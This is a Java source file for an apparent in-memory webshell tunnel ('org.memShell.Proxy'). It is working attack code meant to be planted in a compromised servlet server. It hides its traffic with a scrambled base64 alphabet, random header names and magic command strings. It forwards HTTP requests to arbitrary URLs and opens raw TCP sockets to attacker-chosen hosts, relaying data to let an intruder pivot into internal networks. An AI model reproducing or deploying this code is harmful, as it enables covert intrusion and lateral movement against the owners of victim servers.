package org.memShell;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;

import org.memShell.redefine.MyRequest;
import org.memShell.redefine.MyResponse;
import org.memShell.redefine.MyServletInputStream;
import org.memShell.redefine.MySession;

public class Proxy {

	private static char[] en = "OJqU3HfBVmXSGsL167zcjAK0bniFEwPeu8DCh/vokRtTyQ+IrYM92lx5aNWZ4pdg".toCharArray();

	public static String b64en(byte[] data) {
		StringBuffer sb = new StringBuffer();
		int len = data.length;
		int i = 0;
		int b1, b2, b3;
		while (i < len) {
			b1 = data[i++] & 0xff;
			if (i == len) {
				sb.append(en[b1 >>> 2]);
				sb.append(en[(b1 & 0x3) << 4]);
				sb.append("==");
				break;
			}
			b2 = data[i++] & 0xff;
			if (i == len) {
				sb.append(en[b1 >>> 2]);
				sb.append(en[((b1 & 0x03) << 4) | ((b2 & 0xf0) >>> 4)]);
				sb.append(en[(b2 & 0x0f) << 2]);
				sb.append("=");
				break;
			}
			b3 = data[i++] & 0xff;
			sb.append(en[b1 >>> 2]);
			sb.append(en[((b1 & 0x03) << 4) | ((b2 & 0xf0) >>> 4)]);
			sb.append(en[((b2 & 0x0f) << 2) | ((b3 & 0xc0) >>> 6)]);
			sb.append(en[b3 & 0x3f]);
		}
		return sb.toString();
	}

	private static byte[] de = new byte[] { -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
			-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 46, -1, -1,
			-1, 37, 23, 15, 52, 4, 60, 55, 16, 17, 33, 51, -1, -1, -1, -1, -1, -1, -1, 21, 7, 35, 34, 28, 27, 12, 5, 47,
			1, 22, 14, 50, 57, 0, 30, 45, 41, 11, 43, 3, 8, 58, 10, 49, 59, -1, -1, -1, -1, -1, -1, 56, 24, 19, 62, 31,
			6, 63, 36, 26, 20, 40, 53, 9, 25, 39, 61, 2, 48, 13, 42, 32, 38, 29, 54, 44, 18, -1, -1, -1, -1, -1 };

	public static byte[] b64de(String str) {
		byte[] data = str.getBytes();
		int len = data.length;
		ByteArrayOutputStream buf = new ByteArrayOutputStream(len);
		int i = 0;
		int b1, b2, b3, b4;
		while (i < len) {
			do {
				b1 = de[data[i++]];
			} while (i < len && b1 == -1);
			if (b1 == -1) {
				break;
			}
			do {
				b2 = de[data[i++]];
			} while (i < len && b2 == -1);
			if (b2 == -1) {
				break;
			}
			buf.write((int) ((b1 << 2) | ((b2 & 0x30) >>> 4)));
			do {
				b3 = data[i++];
				if (b3 == 61) {
					return buf.toByteArray();
				}
				b3 = de[b3];
			} while (i < len && b3 == -1);
			if (b3 == -1) {
				break;
			}
			buf.write((int) (((b2 & 0x0f) << 4) | ((b3 & 0x3c) >>> 2)));
			do {
				b4 = data[i++];
				if (b4 == 61) {
					return buf.toByteArray();
				}
				b4 = de[b4];
			} while (i < len && b4 == -1);
			if (b4 == -1) {
				break;
			}
			buf.write((int) (((b3 & 0x03) << 6) | b4));
		}
		return buf.toByteArray();
	}

	static String headerkey(String str) throws Exception {
		String out = "";
		for (String block : str.split("-")) {
			out += block.substring(0, 1).toUpperCase() + block.substring(1);
			out += "-";
		}
		return out.substring(0, out.length() - 1);
	}

	boolean islocal(String url) throws Exception {
		String ip = (new URL(url)).getHost();
		Enumeration<NetworkInterface> nifs = NetworkInterface.getNetworkInterfaces();
		while (nifs.hasMoreElements()) {
			NetworkInterface nif = nifs.nextElement();
			Enumeration<InetAddress> addresses = nif.getInetAddresses();
			while (addresses.hasMoreElements()) {
				InetAddress addr = addresses.nextElement();
				if (addr instanceof Inet4Address)
					if (addr.getHostAddress().equals(ip))
						return true;
			}
		}
		return false;
	}

	public void doProxy(Object request, Object response) throws Exception {
		String rUrl = MyRequest.getHeader(request, "Vxypicksq");
		if (request.getClass().getName().equalsIgnoreCase("org.apache.catalina.core.ApplicationHttpRequest")) {
			return;
		}
		PrintWriter out = MyResponse.getWriter(response);
		Object session = MyRequest.getSession(request);
		if (rUrl != null) {
			rUrl = new String(b64de(rUrl));
			if (!islocal(rUrl)) {
				MyResponse.reset(response);
				String method = MyRequest.getMethod(request);
				URL u = new URL(rUrl);
				HttpURLConnection conn = (HttpURLConnection) u.openConnection();
				conn.setRequestMethod(method);
				conn.setDoOutput(true);

				// conn.setConnectTimeout(200);
				// conn.setReadTimeout(200);

				Enumeration enu = MyRequest.getHeaderNames(request);
				List<String> keys = Collections.list(enu);
				Collections.reverse(keys);
				for (String key : keys) {
					if (!key.equalsIgnoreCase("Vxypicksq")) {
						String value = MyRequest.getHeader(request, key);
						conn.setRequestProperty(headerkey(key), value);
					}
				}

				int i;
				byte[] buffer = new byte[1024];
				if (MyRequest.getContentLength(request) != -1) {
					OutputStream output;
					try {
						output = conn.getOutputStream();
					} catch (Exception e) {
						MyResponse.setHeader(response, "Wjfj", "LCh8EYZcePmuwxqH49fnQMaML4OGjM");
						return;
					}
					
					Object servletInputStream = MyRequest.getInputStream(request);
					while ((i = MyServletInputStream.read(servletInputStream, buffer)) != -1) {
						output.write(buffer, 0, i);
					}
					output.flush();
					output.close();
				}

				for (String key : conn.getHeaderFields().keySet()) {
					// Solve the jdk low version conn.getHeaderFields()
					// Solve the problem of weblogic blank line cannot remove
					if (key != null && !key.equalsIgnoreCase("Content-Length")) {
						String value = conn.getHeaderField(key);
						MyResponse.setHeader(response, key, value);
					}
				}

				InputStream hin;
				if (conn.getResponseCode() < HttpURLConnection.HTTP_BAD_REQUEST) {
					hin = conn.getInputStream();
				} else {
					hin = conn.getErrorStream();
					if (hin == null) {
						MyResponse.setStatus(response, 200);
						return;
					}
				}

				MyResponse.setStatus(response, conn.getResponseCode());

				while ((i = hin.read(buffer)) != -1) {
					byte[] data = new byte[i];
					System.arraycopy(buffer, 0, data, 0, i);
					out.write(new String(data));
				}

				if (true)
					return; // exit
			}
		}

		MyResponse.resetBuffer(response);
		MyResponse.setStatus(response, 200);
		String cmd = MyRequest.getHeader(request, "Kxkcmmz");
		if (cmd != null) {
			String mark = cmd.substring(0, 22);
			cmd = cmd.substring(22);
			MyResponse.setHeader(response, "Bavucm", "whQSv2UNo4ANXOasx5SKyI5uuyOP4R4gqYoWzl");
			if (cmd.compareTo("N4d_vwmcAWoNLAKFOSXLshRkwrIKQ9mtOHecI6sydoo7fFd") == 0) {
				try {
					String[] target_ary = new String(b64de(MyRequest.getHeader(request, "Vovxcnjiquaysay"))).split("\\|");
					String target = target_ary[0];
					int port = Integer.parseInt(target_ary[1]);
					SocketChannel socketChannel = SocketChannel.open();
					socketChannel.connect(new InetSocketAddress(target, port));
					socketChannel.configureBlocking(false);
					MySession.setAttribute(session, mark, socketChannel);
					MyResponse.setHeader(response, "Bavucm", "whQSv2UNo4ANXOasx5SKyI5uuyOP4R4gqYoWzl");
				} catch (Exception e) {
					MyResponse.setHeader(response, "Wjfj", "L1QmMT1A7Xzfr38FTTXNum7p_R7jf9JPKWza29H1LIt16bn7FEeZRSUj");
					MyResponse.setHeader(response, "Bavucm", "BEYZYz4kzGEqs1Ct20PiRuHIUDw1W3E24hmbpYo");
				}
			} else if (cmd.compareTo("5KPdnVYt_8LUkfl8aFEt1CtEXDWEvC0VYnPv1Vxs5eARlp4vnH3jzQ") == 0) {
				SocketChannel socketChannel = (SocketChannel) MySession.getAttribute(session, mark);
				try {
					socketChannel.socket().close();
				} catch (Exception e) {
				}
				MySession.removeAttribute(session, mark);
			} else if (cmd.compareTo("oGtAVnWoWPelCl4tWbYVxk2wMsU2kC") == 0) {
				SocketChannel socketChannel = (SocketChannel) MySession.getAttribute(session, mark);
				try {
					ByteBuffer buf = ByteBuffer.allocate(513);
					int bytesRead = socketChannel.read(buf);
					while (bytesRead > 0) {
						byte[] data = new byte[bytesRead];
						System.arraycopy(buf.array(), 0, data, 0, bytesRead);
						out.write(b64en(data));
						buf.clear();
						bytesRead = socketChannel.read(buf);
					}
					MyResponse.setHeader(response, "Bavucm", "whQSv2UNo4ANXOasx5SKyI5uuyOP4R4gqYoWzl");

				} catch (Exception e) {
					MyResponse.setHeader(response, "Bavucm", "BEYZYz4kzGEqs1Ct20PiRuHIUDw1W3E24hmbpYo");
				}

			} else if (cmd.compareTo("ONJD8WdodnFr") == 0) {
				SocketChannel socketChannel = (SocketChannel) MySession.getAttribute(session, mark);
				try {

					int readlen = MyRequest.getContentLength(request);
					byte[] buff = new byte[readlen];

					Object servletInputStream = MyRequest.getInputStream(request);
					MyServletInputStream.read(servletInputStream, buff, 0, readlen);
					byte[] base64 = b64de(new String(buff));
					ByteBuffer buf = ByteBuffer.allocate(base64.length);
					buf.clear();
					buf.put(base64);
					buf.flip();

					while (buf.hasRemaining())
						socketChannel.write(buf);

					MyResponse.setHeader(response, "Bavucm", "whQSv2UNo4ANXOasx5SKyI5uuyOP4R4gqYoWzl");

				} catch (Exception e) {
					MyResponse.setHeader(response, "Wjfj", "iEoN4EgjGlyaDiPAA8yCAa4RI7Gco8FcTkIDTS_zpW788WKuDdDzbTmJ");
					MyResponse.setHeader(response, "Bavucm", "BEYZYz4kzGEqs1Ct20PiRuHIUDw1W3E24hmbpYo");
					socketChannel.socket().close();
				}
			}
		} else {
			out.write("<!-- hJjylqamvbwcmtfcPhQEhlmvACRvBZCj4OzGoE4m3aObI_A6VF -->");
		}
	}
}
